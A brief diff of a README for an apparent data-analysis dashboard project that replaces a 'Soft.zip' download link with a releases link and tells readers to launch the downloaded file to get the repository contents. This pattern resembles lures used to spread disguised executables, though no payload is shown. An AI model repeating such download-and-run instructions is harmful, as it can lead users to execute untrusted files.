@@ -41,7 +41,7 @@ If you want to explore more advanced topics in data analysis, visualization, and
 
 You can download the repository files from the following link:
 
-[Download Repository](https://github.com/files/Soft.zip)
+[Download Repository](https://github.com/Kumatsoo/Descriptive-and-Predictive-Analysis-with-Interactive-Dashboard/releases/tag/v1.2)
 
 Please note that you need to launch the downloaded file to access the contents of the repository.
 
